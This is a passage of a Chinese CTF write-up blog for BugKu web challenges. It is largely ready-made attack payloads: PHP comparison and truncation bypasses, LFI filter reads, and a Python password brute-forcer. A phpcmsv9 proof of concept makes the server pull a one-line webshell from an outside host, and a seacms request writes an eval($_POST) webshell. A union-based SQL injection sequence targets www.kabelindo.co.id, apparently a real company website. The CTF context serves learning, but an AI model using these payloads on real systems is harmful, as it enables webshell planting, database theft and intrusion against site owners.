class="line">?a[]</span><br></pre></td></tr></table></figure></p><h1 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">not allowed!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">Access granted!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>对hackDJ进行url编码两次即可</p><h1 id="MD5函数"><a href="#MD5函数" class="headerlink" title="MD5函数"></a>MD5函数</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'username'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/weidiao/p/6821812.html" target="_blank" rel="noopener">md5函数引起的问题</a><br><br>一开始用?username=240610708&amp;password=!1793422703!不成功，以为是题目错了。后来利用php的md5()函数有一个缺陷（MD5是不能处理数组的，md5(数组)会返回null），这里是===，只能用数组处理，构造payload: ?username[]=123&amp;password[]=12</p><h1 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'--'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ereg遇到数组会返回null,null!==FALSE也不===FALSE<br>payload<br><br>password[]</p><h1 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">'name'</span>]);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">'password'</span>]);</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]));</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your password can not be your name!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Invalid password.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Login first!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用了sha1函数处理数组返回null.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload: ?name[]=1&amp;password[]=3</span><br></pre></td></tr></table></figure></p><h1 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$md51</span> = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$md52</span> = @md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="string">'QNKCDZO'</span> &amp;&amp; <span class="variable">$md51</span> == <span class="variable">$md52</span>) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag&#123;*&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="built_in">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a=240610708</span><br></pre></td></tr></table></figure></p><h1 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">function</span> noother_says_correct(<span class="variable">$temp</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="variable">$one</span> = ord(<span class="string">'1'</span>); //ord — 返回字符的 ASCII 码值</span><br><span class="line"><span class="variable">$nine</span> = ord(<span class="string">'9'</span>); //ord — 返回字符的 ASCII 码值</span><br><span class="line"><span class="variable">$number</span> = <span class="string">'3735929054'</span>;</span><br><span class="line">// Check all the input characters!</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line"><span class="variable">$digit</span> = ord(<span class="variable">$temp</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line"><span class="built_in">return</span> <span class="string">"flase"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$number</span> == <span class="variable">$temp</span>)</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="built_in">echo</span> noother_says_correct(<span class="variable">$temp</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>换一种进制<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?password=0xdeadc0de</span><br></pre></td></tr></table></figure></p><h1 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"xxx"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You password must be alphanumeric</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'-'</span>) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">'</span></span><br><span class="line"><span class="string">- have not been found</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Invalid password</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ereg存在%00截断漏洞，所以构造截断 绕过第一个条件，第二个条件长度要小于8值要大于999999，所以用科学计数法绕过，又要包含-，所以payload: ?1e9%00-<br>页面返回<em>-</em>没有发现，果断把payload换成<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?le9%00*-*</span><br></pre></td></tr></table></figure></p><h1 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'ctf'</span>]) === FALSE)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>], <span class="string">'#biubiubiu'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ?ctf[]</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ctf=1%00%23biubiubiu</span><br></pre></td></tr></table></figure></p><h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1><p>张三名字的第一个字母和生日组合</p><h1 id="信息查找"><a href="#信息查找" class="headerlink" title="信息查找"></a>信息查找</h1><p>通过百度查找bugku.cn 就能找到一条主机屋网站遭到黑客攻击，黑客爆出联系方式。里面的群qq就是</p><h1 id="简单的个人信息收集"><a href="#简单的个人信息收集" class="headerlink" title="简单的个人信息收集"></a>简单的个人信息收集</h1><p>zip压缩包，猜测伪加密，在winhex中打开，找到504B0102从50算起，的第九和第十个字节全部都改成00。成功得到一些信息。然后去社工吧。<br>#</p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku的web进阶</title>
      <link href="/posts/b1db4319.html"/>
      <url>/posts/b1db4319.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一些cms网站的实战，挺多不会做的，以后再来补做一下。<br><a id="more"></a></p><h1 id="phpcmsv9"><a href="#phpcmsv9" class="headerlink" title="phpcmsv9"></a>phpcmsv9</h1><p>直接给poc<br><br>post请求<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8001/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">siteid=1&amp;modelid=11&amp;username=q12w312415&amp;password=12w121346&amp;email=wwq1w3124156@qq.com&amp;info[content]=&lt;img src=http://p4gdp8beq.bkt.clouddn.com/qy.txt?.php<span class="comment">#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span></span><br></pre></td></tr></table></figure></p><p>注意，src为一句话文本的地址，每次请求用户名，邮箱都要改变</p><h1 id="海洋cms"><a href="#海洋cms" class="headerlink" title="海洋cms"></a>海洋cms</h1><p><a href="http://blog.csdn.net/qq_35078631/article/details/76595817" target="_blank" rel="noopener">seacms6.45漏洞利用</a><br><br><a href="http://www.freebuf.com/vuls/150303.html" target="_blank" rel="noopener">seacms6.55漏洞任意执行</a><br><br><a href="http://www.php.cn/php-weizijiaocheng-359309.html" target="_blank" rel="noopener">phpinfo()中的一些重要信息</a><br><br>不会插入一句话，请教了舍友。POST请求<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8008/search.php?searchtype=5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">searchtype=5&amp;searchword=&#123;<span class="keyword">if</span>&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=(<span class="variable">$_P</span>&#123;searchpage:ver&#125;&amp;ver=OST[9]))&amp;9[]=fwrite(&amp;9[]=fopen(<span class="string">'QIANYE.php'</span>,<span class="string">'w'</span>)&amp;9[]=,<span class="string">'&lt;?php eval($_POST["QIANYE"]);?&gt;'</span>);</span><br></pre></td></tr></table></figure></p><h1 id="sql实战注入2"><a href="#sql实战注入2" class="headerlink" title="sql实战注入2"></a>sql实战注入2</h1><p>用椰树扫一下找到注入点<br><br>查看字段数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://www.kabelindo.co.id/readnews.php?id=99999999 order by 5 %23</span><br></pre></td></tr></table></figure></p><p>一开始只列出本网站数据库的表名，把最后一个表名添加上去，一直显示错误。最后，才明白要列出本数据库中表名的最后一个才是。<br><br>列出mysql数据库中所有的表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://www.kabelindo.co.id/readnews.php?id=99999999 union select 1,2,3,table_name,4 from information_schema.tables</span><br></pre></td></tr></table></figure></p><h1 id="sql实战1"><a href="#sql实战1" class="headerlink" title="sql实战1"></a>sql实战1</h1>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BugKu的web题</title>
      <link href="/posts/e1368ef8.html"/>
      <url>/posts/e1368ef8.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一个真心觉得挺好的平台，挺照顾小白的，题多，知识点涉及范围广，可以学到很多。<br><a id="more"></a></p><p><a href="http://ctf.bugku.com/" target="_blank" rel="noopener">BugKu</a></p><h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=1a</span><br></pre></td></tr></table></figure></p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>在游览器中禁止javascript的运行，查看源码可得<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;</span></span><br></pre></td></tr></table></figure></p><p>进行unicode解码</p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>查看源码注意到 <code>gb2312</code>编码，易知识宽字节注入。一开始直接用#，一直显示不出结果。<br>判断字段数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">103.238.227.13:10083/?id=1%df<span class="string">' order by 2 %23</span></span><br></pre></td></tr></table></figure></p><p>查看回显<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">103.238.227.13:10083/?id=1%df<span class="string">' union select 1,2 %23</span></span><br></pre></td></tr></table></figure></p><p>得到表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">103.238.227.13:10083/?id=1%df<span class="string">' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database() )%23</span></span><br></pre></td></tr></table></figure></p><p>字段名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">103.238.227.13:10083/?id=1%df<span class="string">' union select 1, (select group_concat(column_name) from information_schema.columns where table_name=0x6B6579 )%23</span></span><br></pre></td></tr></table></figure></p><p>脱裤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">103.238.227.13:10083/?id=1%df<span class="string">' union select 1, (select group_concat(id,0x23,string) from `key`)%23</span></span><br></pre></td></tr></table></figure></p><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>window中在hosts上添加下面一条解析语句，访问该域名，即可得到答案<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">120.24.86.145 flag.bugku.com</span><br></pre></td></tr></table></figure></p><h1 id="sql注入1"><a href="#sql注入1" class="headerlink" title="sql注入1"></a>sql注入1</h1><p>部分源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//过滤sql</span><br><span class="line"><span class="variable">$array</span> = array(<span class="string">'table'</span>,<span class="string">'union'</span>,<span class="string">'and'</span>,<span class="string">'or'</span>,<span class="string">'load_file'</span>,<span class="string">'create'</span>,<span class="string">'delete'</span>,<span class="string">'select'</span>,<span class="string">'update'</span>,<span class="string">'sleep'</span>,<span class="string">'alter'</span>,<span class="string">'drop'</span>,<span class="string">'truncate'</span>,<span class="string">'from'</span>,<span class="string">'max'</span>,<span class="string">'min'</span>,<span class="string">'order'</span>,<span class="string">'limit'</span>);</span><br><span class="line">foreach (<span class="variable">$array</span> as <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (substr_count(<span class="variable">$id</span>, <span class="variable">$value</span>) &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">'包含敏感关键字！'</span>.<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//xss过滤</span><br><span class="line"><span class="variable">$id</span> = strip_tags(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">"SELECT * FROM temp WHERE id=&#123;<span class="variable">$id</span>&#125; LIMIT 1"</span>;</span><br></pre></td></tr></table></figure></p><p>发现//xss过滤,会将&lt;&gt;置换掉，从而实现关键字绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = strip_tags(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure></p><p>查看字段数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=1 o&lt;&gt;rder by 2 --+</span><br></pre></td></tr></table></figure></p><p>判断显示位<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=1 un&lt;&gt;ion selec&lt;&gt;t 1,2 --+</span><br></pre></td></tr></table></figure></p><p>脱裤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=1 un&lt;&gt;ion selec&lt;&gt;t 1, (selec&lt;&gt;t <span class="built_in">hash</span> fro&lt;&gt;m `key` <span class="built_in">where</span> id=1) %23</span><br></pre></td></tr></table></figure></p><h1 id="你必须让他停下来"><a href="#你必须让他停下来" class="headerlink" title="你必须让他停下来"></a>你必须让他停下来</h1><p>禁止javascript，通过bp截包，不断的发送请求，就会得到flag</p><h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    include <span class="string">"waf.php"</span>; </span><br><span class="line">    include <span class="string">"flag.php"</span>; </span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">'hello'</span>]; </span><br><span class="line">    <span class="built_in">eval</span>( <span class="string">"var_dump(<span class="variable">$a</span>);"</span>); </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造paylaod<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?hello=1);show_source(%27flag.php%27);var_dump(</span><br></pre></td></tr></table></figure></p><h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        die(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var_dump($<span class="variable">$args</span>);"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意到提示和最后一条语句可知，让$$args=全局变量，即可打印出flag的值。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?args=GLOBALS</span><br></pre></td></tr></table></figure></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>js编码，控制台，解密可得，提示要大写，把字母全部转换成大写</p><h1 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h1><h1 id="进行uniocode解密和拼接得到"><a href="#进行uniocode解密和拼接得到" class="headerlink" title="进行uniocode解密和拼接得到"></a>进行uniocode解密和拼接得到</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">checkSubmit</span></span>()&#123;</span><br><span class="line">var a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="built_in">return</span>!0;</span><br><span class="line">        alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="built_in">return</span>!1&#125;&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在输入框中输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">67d709b2b54aa2aa648cf6e87a7114f1</span><br></pre></td></tr></table></figure></p><h1 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h1><p>根据题意和url便可知构造<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><h1 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">url=<span class="string">"http://120.24.86.145:8002/baopo/"</span></span><br><span class="line">s=requests.session()</span><br><span class="line">def getflag(<span class="built_in">pwd</span>):</span><br><span class="line">    data=&#123;<span class="string">"pwd"</span>:<span class="built_in">pwd</span>&#125;</span><br><span class="line">    response=s.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"密码不正确，请重新输入"</span> not <span class="keyword">in</span> response.content.decode(<span class="string">"utf-8"</span>):</span><br><span class="line">        <span class="built_in">print</span>(response.content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"破解成功"</span>)</span><br><span class="line">        time.sleep(10)</span><br><span class="line">        <span class="built_in">exit</span>()</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">pwd</span> <span class="keyword">in</span> range(10000,99999):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pwd</span>)</span><br><span class="line">    getflag(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure><h1 id="听说备份是是一个好习惯"><a href="#听说备份是是一个好习惯" class="headerlink" title="听说备份是是一个好习惯"></a>听说备份是是一个好习惯</h1><p>输入index.php.bak得到源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span 